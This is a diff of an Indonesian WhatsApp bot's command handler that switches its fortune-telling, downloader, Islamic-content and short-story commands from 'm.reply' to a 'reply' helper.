 var hasil = pickRandom(storyanime)
@@ -2449,14 +2456,14 @@ break
          case 'nomerhoki': case 'nomorhoki': {
                 if (!Number(text)) throw `Example : ${prefix + command} 6285822347348`
                 let anu = await primbon.nomer_hoki(Number(text))
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nomor HP :* ${anu.message.nomer_hp}\n• *Angka Shuzi :* ${anu.message.angka_shuzi}\n• *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n• *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
             }
             break
             case 'artimimpi': case 'tafsirmimpi': {
                 if (!text) throw `Example : ${prefix + command} belanja`
                 let anu = await primbon.tafsir_mimpi(text)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Mimpi :* ${anu.message.mimpi}\n• *Arti :* ${anu.message.arti}\n• *Solusi :* ${anu.message.solusi}`, m)
             }
             break
@@ -2464,7 +2471,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2472,7 +2479,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2480,7 +2487,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama Suami :* ${anu.message.suami.nama}\n• *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n• *Nama Istri :* ${anu.message.istri.nama}\n• *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2488,14 +2495,14 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                 let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                 let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama Anda :* ${anu.message.nama_anda.nama}\n• *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n• *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n• *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
             case 'artinama': {
                 if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                 let anu = await primbon.arti_nama(text)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2503,7 +2510,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Life Path :* ${anu.message.life_path}\n• *Destiny :* ${anu.message.destiny}\n• *Destiny Desire :* ${anu.message.destiny_desire}\n• *Personality :* ${anu.message.personality}\n• *Persentase :* ${anu.message.persentase_kecocokan}`, m)
             }
             break
@@ -2511,7 +2518,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika|Novia`
                 let [nama1, nama2] = text.split`|`
                 let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendImage(m.chat,  anu.message.gambar, `• *Nama Anda :* ${anu.message.nama_anda}\n• *Nama Pasangan :* ${anu.message.nama_pasangan}\n• *Sisi Positif :* ${anu.message.sisi_positif}\n• *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
             }
             break
@@ -2519,7 +2526,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Tanggal Pernikahan :* ${anu.message.tanggal}\n• *karakteristik :* ${anu.message.karakteristik}`, m)
             }
             break
@@ -2527,7 +2534,7 @@ break
                 if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Usaha :* ${anu.message.usaha}`, m)
             }
             break
@@ -2535,7 +2542,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Rezeki :* ${anu.message.rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2543,7 +2550,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Lahir :* ${anu.message.hari_lahir}\n• *Pekerjaan :* ${anu.message.pekerjaan}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2551,7 +2558,7 @@ break
                 if (!text) throw `Example❗:\n${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.ramalan_nasib(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Angka Akar :* ${anu.message.angka_akar}\n• *Sifat :* ${anu.message.sifat}\n• *Elemen :* ${anu.message.elemen}\n• *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
             }
             break
@@ -2559,7 +2566,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Analisa :* ${anu.message.analisa}\n• *Sektor :* ${anu.message.sektor}\n• *Elemen :* ${anu.message.elemen}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2567,7 +2574,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendImage(m.chat, anu.message.image, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Simbol Tarot :* ${anu.message.simbol_tarot}\n• *Arti :* ${anu.message.arti}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2575,7 +2582,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika,1,2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
                 let [nama, gender, tahun] = text.split`,`
                 let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tahun_lahir}\n• *Gender :* ${anu.message.jenis_kelamin}\n• *Angka Kua :* ${anu.message.angka_kua}\n• *Kelompok :* ${anu.message.kelompok}\n• *Karakter :* ${anu.message.karakter}\n• *Sektor Baik :* ${anu.message.sektor_baik}\n• *Sektor Buruk :* ${anu.message.sektor_buruk}`, m)
             }
             break
@@ -2583,7 +2590,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.petung_hari_baik(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Kala Tinantang :* ${anu.message.kala_tinantang}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2591,7 +2598,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}\n• *Info :* ${anu.message.info}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2599,7 +2606,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Hari Naas :* ${anu.message.hari_naas}\n• *Info :* ${anu.message.catatan}\n• *Catatan :* ${anu.message.info}`, m)
             }
             break
@@ -2607,7 +2614,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *Tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2615,7 +2622,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Hari Lahir :* ${anu.message.hari_lahir}\n• *tanggal Lahir :* ${anu.message.tgl_lahir}\n• *Arah Rezeki :* ${anu.message.arah_rejeki}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2623,7 +2630,7 @@ break
                 if (!text) throw `Example : ${prefix + command} DIka,7,7,2005,2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
                 let [nama, tgl, bln, thn, untuk] = text.split`,`
                 let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2631,7 +2638,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 7,7,2005`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.weton_jawa(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
             }
             break
@@ -2639,7 +2646,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`, m)
             }
             break
@@ -2647,7 +2654,7 @@ break
                 if (!text) throw `Example : ${prefix + command} Dika, 7,7,2005`
                 let [nama, tgl, bln, thn] = text.split`,`
                 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`, m)
             }
             break
@@ -2655,7 +2662,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 12,1,2022`
                 let [tgl, bln, thn] = text.split`,`
                 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2663,7 +2670,7 @@ break
                 if (!text) throw `Example : ${prefix + command} 12,1,2022,28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
                 let [tgl, bln, thn, siklus] = text.split`,`
                 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`, m)
             }
             break
@@ -2698,13 +2705,13 @@ break
                 let zodiac = await getZodiac(birth[1], birth[2])
                 
                 let anu = await primbon.zodiak(zodiac)
-                if (anu.status == false) return m.reply(anu.message)
+                if (anu.status == false) return reply(anu.message)
                 SatganzDevs.sendText(m.chat, `⭔ *Zodiak :* ${anu.message.zodiak}\n⭔ *Nomor :* ${anu.message.nomor_keberuntungan}\n⭔ *Aroma :* ${anu.message.aroma_keberuntungan}\n⭔ *Planet :* ${anu.message.planet_yang_mengitari}\n⭔ *Bunga :* ${anu.message.bunga_keberuntungan}\n⭔ *Warna :* ${anu.message.warna_keberuntungan}\n⭔ *Batu :* ${anu.message.batu_keberuntungan}\n⭔ *Elemen :* ${anu.message.elemen_keberuntungan}\n⭔ *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
             }
             break
 //━━━━━━━━━━━━━━━[ BATAS ]━━━━━━━━━━━━━━━━━//
 case 'darkjokes': case 'mountain': case 'meme': case 'aestatic': case 'art': case 'boneka': case 'cyber': case 'doraemon': case 'exo': case 'wallpapergame': case 'islamic': case 'kartun': case 'katakata': case 'kpop': case 'mobil': case 'motor': case 'pokemon': case 'programming': case 'pubg': case 'quotesyt': case 'stanic': case 'tatasurya': case 'technology': case 'wallhp': case 'wallml': case 'wallnime': case 'yulibocil': 
-m.reply(mess.wait)
+reply(mess.wait)
 var but = [{buttonId: `${command}`, buttonText: { displayText: "NEXT➡️" }, type: 1 }]
 var darkjokes = JSON.parse(fs.readFileSync(`./storage/wallpaper/${command}.json`))
 var hasil = pickRandom(darkjokes)
@@ -2713,7 +2720,7 @@ break
 //ANJAY ALOK//
             case 'joox': case 'jooxdl': {
                 if (!text) throw 'No Query Title'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/downloader/joox', { query: text }, 'f22b3c4c2c'))
                 let msg = await SatganzDevs.sendImage(m.chat, anu.result.img, `• Title : ${anu.result.lagu}\n• Album : ${anu.result.album}\n• Singer : ${anu.result.penyanyi}\n• Publish : ${anu.result.publish}\n• Lirik :\n${anu.result.lirik.result}`, m)
                 SatganzDevs.sendMessage(m.chat, { audio: { url: anu.result.mp4aLink }, mimetype: 'audio/mpeg', fileName: anu.result.lagu+'.m4a' }, { quoted: msg })
@@ -2721,7 +2728,7 @@ break
             break
             case 'soundcloud': case 'scdl': {
                 if (!text) throw 'No Query Title'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/downloader/soundcloud', { url: isUrl(text)[0] }, 'f22b3c4c2c'))
                 let msg = await SatganzDevs.sendImage(m.chat, anu.result.thumb, `• Title : ${anu.result.title}\n• Url : ${isUrl(text)[0]}`)
                 SatganzDevs.sendMessage(m.chat, { audio: { url: anu.result.url }, mimetype: 'audio/mpeg', fileName: anu.result.title+'.m4a' }, { quoted: msg })
@@ -2729,7 +2736,7 @@ break
             break
 	        case 'twitdl': case 'twitter': {
                 if (!text) throw 'Masukkan Query Link!'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'f22b3c4c2c'))
                 let buttons = [
                     {buttonId: `twittermp3 ${text}`, buttonText: {displayText: '► Audio'}, type: 1}
@@ -2746,7 +2753,7 @@ break
             break
             case 'twittermp3': case 'twitteraudio': {
                 if (!text) throw 'Masukkan Query Link!'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/api/downloader/twitter', { url: text }, 'f22b3c4c2c'))
                 let buttons = [
                     {buttonId: `twitter ${text}`, buttonText: {displayText: '► Video'}, type: 1}
@@ -2764,13 +2771,13 @@ break
             break
 	        case 'fbdl': case 'fb': case 'facebook': {
                 if (!text) throw 'Masukkan Query Link!'
-                m.reply(mess.wait)
+                reply(mess.wait)
                 let anu = await fetchJson(api('zenz', '/api/downloader/facebook', { url: text }, 'f22b3c4c2c'))
                 SatganzDevs.sendMessage(m.chat, { video: { url: anu.result.url }, caption: `• Title : ${anu.result.title}`}, { quoted: m })
             }
             break
 	        case 'pinterest': {
-m.reply(mess.wait)
+reply(mess.wait)
 let { pinterest } = require('./lib/scraper')
 anu = await pinterest(text)
 result = anu[Math.floor(Math.random() * anu.length)]
@@ -2819,9 +2826,9 @@ Untuk Download Media Silahkan Klik salah satu Button dibawah ini atau masukkan c
 //INI FITUR ISLAMI KEK NYA WORK SEMUA\nKalo Eror Fix Sendiri ya teman wk//
 				case 'iqra': {
 		oh = `Example : ${prefix + command} 3\n\nIQRA Which Is Available : 1,2,3,4,5,6`
-		if (!text) return m.reply(oh)
+		if (!text) return reply(oh)
 		yy = await getBuffer(`https://islamic-api-indonesia.herokuapp.com/api/data/pdf/iqra${text}`)
-		SatganzDevs.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => m.reply(oh))
+		SatganzDevs.sendMessage(m.chat, {document: yy, mimetype: 'application/pdf', fileName: `iqra${text}.pdf`}, {quoted:m}).catch ((err) => reply(oh))
 		}
 		break
 case 'hadits': case 'hadis': case 'hadist': {
@@ -2852,13 +2859,13 @@ if (!args[1]) throw `Hadis yang ke berapa?\n\ncontoh:\n${prefix + command} musli
 try {
 let res = await fetchJson(`https://fatiharridho.herokuapp.com/api/islamic/hadits?list=${args[0]}`)
 let { number, arab, id } = res.result.find(v => v.number == args[1])
-m.reply(`No. ${number}
+reply(`No. ${number}
 
 ${arab}
 
 ${id}`)
 } catch (e) {
-m.reply(`Hadis tidak ditemukan !`)
+reply(`Hadis tidak ditemukan !`)
 }
 }
 break
@@ -2871,7 +2878,7 @@ let txt = `*Arab* : ${res.result.data.text.arab}
 *Indonesia* : ${res.result.data.translation.id}
 
 ( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
-m.reply(txt)
+reply(txt)
 SatganzDevs.sendMessage(m.chat, {audio: { url: res.result.data.audio.primary }, mimetype: 'audio/mpeg'}, { quoted : m })
 }
 break
@@ -2886,15 +2893,15 @@ case 'tafsirsurah': {
 *Long* : ${res.result.data.tafsir.id.long}
 
 ( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
-		m.reply(txt)
+		reply(txt)
 		}
 		break
 case 'kisahnabi': {
-if (!text) return m.reply(`Mau Kisah Nabi Siapa?\n\nList Nama Nabi :\n1. adam\n2. idris\n3. nuh\n4. hud\n5. saleh\n6. ibrahim\n7. luth\n8. ismail\n9. ishaq\n10. yaqub\n11. yusuf\n12. ayub\n13. syuaib\n14. musa\n15. harun\n16. dzulkifli\n17. daud\n18. sulaiman\n19. ilyas\n20. ilyasa\n21. yunus\n22. zakaria\n23. yahya\n24. musa\n25. muhammad\n\nExample: ${prefix+command} Muhammad`)
+if (!text) return reply(`Mau Kisah Nabi Siapa?\n\nList Nama Nabi :\n1. adam\n2. idris\n3. nuh\n4. hud\n5. saleh\n6. ibrahim\n7. luth\n8. ismail\n9. ishaq\n10. yaqub\n11. yusuf\n12. ayub\n13. syuaib\n14. musa\n15. harun\n16. dzulkifli\n17. daud\n18. sulaiman\n19. ilyas\n20. ilyasa\n21. yunus\n22. zakaria\n23. yahya\n24. musa\n25. muhammad\n\nExample: ${prefix+command} Muhammad`)
 var tipe = (args[0] || '').toLowerCase()
 switch (tipe) {
 case 'adam': case 'idris': case 'nuh': case 'hud': case 'saleh': case 'ibrahim': case 'luth': case 'ismail': case 'ishaq': case 'yaqub': case 'yusuf': case 'ayub': case 'syuaib': case 'musa': case 'harun': case 'dzulkifli': case 'daud': case 'sulaiman': case 'ilyas': case 'ilyasa': case 'yunus': case 'zakaria': case 'yahya': case 'musa': case 'muhammad': 
-m.reply(mess.wait)
+reply(mess.wait)
 let kisah = await fetchJson(`https://raw.githubusercontent.com/NzrlAfndi/Databasee/main/Islami/${text}.json`)
 resNabi = `Kisah Nabi ${text}
 
@@ -2909,11 +2916,11 @@ SatganzDevs.sendMessage(m.chat, { image: { url: `${kisah.image_url}` }, caption:
 }
 break
 case 'niatsolat': {
-if (!text) return m.reply(`Mau Niat Solat Apa?\n\nList Niat Solat :\n1. subuh\n2. dzuhur\n3. ashar\n4. maghrib\n5. isya\n\nExample: ${prefix+command} subuh`)
+if (!text) return reply(`Mau Niat Solat Apa?\n\nList Niat Solat :\n1. subuh\n2. dzuhur\n3. ashar\n4. maghrib\n5. isya\n\nExample: ${prefix+command} subuh`)
 var tipe = (args[0] || '').toLowerCase()
 switch (tipe) {
 case 'subuh': case 'dzuhur': case 'ashar': case 'maghrib': case 'isya':
-m.reply(mess.wait)
+reply(mess.wait)
 let niat = await fetchJson(`https://raw.githubusercontent.com/NzrlAfndi/Databasee/main/Niatsolat/${text}.json`)
 let resniat = `Niat Solat ${text}
   
@@ -2922,7 +2929,7 @@ let resniat = `Niat Solat ${text}
 ❏ *Latin* : ${niat.latin}
 ❏ *Indonesia* : ${niat.terjemahan}
 `
-m.reply(resniat)
+reply(resniat)
  }
 }
 break
@@ -2936,7 +2943,7 @@ capt += `❏ *Arab*: ${i.arabic}\n`
 capt += `❏ *Arti ID*: ${i.translation_id}\n`
 capt += `❏ *Arti EN*: ${i.translation_en}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n`
 }
-m.reply(capt)
+reply(capt)
 }
 break
 case 'jadwalsholat':
@@ -2953,20 +2960,20 @@ capt += `Dzuhur : ${i.dzuhur}\n`
 capt += `Ashar : ${i.ashar}\n`
 capt += `Maghrib : ${i.maghrib}\n`
 capt += `Isya : ${i.isya}\n\n`
-m.reply(capt)
+reply(capt)
 }
 break
 case 'ceramah': {
-if (!text) return m.reply(`Mau Ceramah Dari Siapa?\n\nList Ustadz :\n1. abdulsomad\n2. adihidayat\n3. felixsiauw\n4. khalidbasalamah\n\nExample: ${prefix+command} abdulsomad`)
+if (!text) return reply(`Mau Ceramah Dari Siapa?\n\nList Ustadz :\n1. abdulsomad\n2. adihidayat\n3. felixsiauw\n4. khalidbasalamah\n\nExample: ${prefix+command} abdulsomad`)
 var tipe = (args[0] || '').toLowerCase()
 switch (tipe) {
 case 'abdulsomad': case 'adihidayat': case 'felixsiauw': case 'khalidbasalamah': 
-m.reply(mess.wait)
+reply(mess.wait)
 let ceramah = await fetchJson(`https://raw.githubusercontent.com/NzrlAfndi/Databasee/main/Ceramah/${text}.json`)
 let rescera = `Ceramah Dari *${ceramah.name}*
 
 ${ceramah.ceramah}`
-m.reply(rescera)
+reply(rescera)
 }
 }
 break
@@ -2974,7 +2981,7 @@ break
 //━━━━━━━━━━━━━━━[ RANDOM CERPEN ]━━━━━━━━━━━━━━━━━//
 case 'cerpen-anak':{
 let hasil = await cerpen(`anak`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -2984,7 +2991,7 @@ m.reply(`
 break
 case 'cerpen-bahasadaerah':{
 let hasil = await cerpen(`bahasa daerah`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -2994,7 +3001,7 @@ m.reply(`
 break
 case 'cerpen-bahasainggris':{
 let hasil = await cerpen(`bahasa Inggris`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3004,7 +3011,7 @@ m.reply(`
 break
 case 'cerpen-bahasajawa':{
 let hasil = await cerpen(`bahasa jawa`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3014,7 +3021,7 @@ m.reply(`
 break
 case 'cerpen-bahasasunda':{
 let hasil = await cerpen(`bahasa sunda`)
-m.reply(`
+reply(`
  ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3024,7 +3031,7 @@ m.reply(`
 break
 case 'cerpen-budaya':{
 let hasil = await cerpen(`budaya`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3034,7 +3041,7 @@ m.reply(`
 break
 case 'cerpen-cinta':{
 let hasil = await cerpen(`cinta`)
-m.reply(`
+reply(`
 ❏ *Judul*: ${hasil.title}
 ❏ *Author*: ${hasil.author}
 ❏ *Category*:${hasil.kategori}
@@ -3044,7 +3051,7 @@ m.reply(`
 break
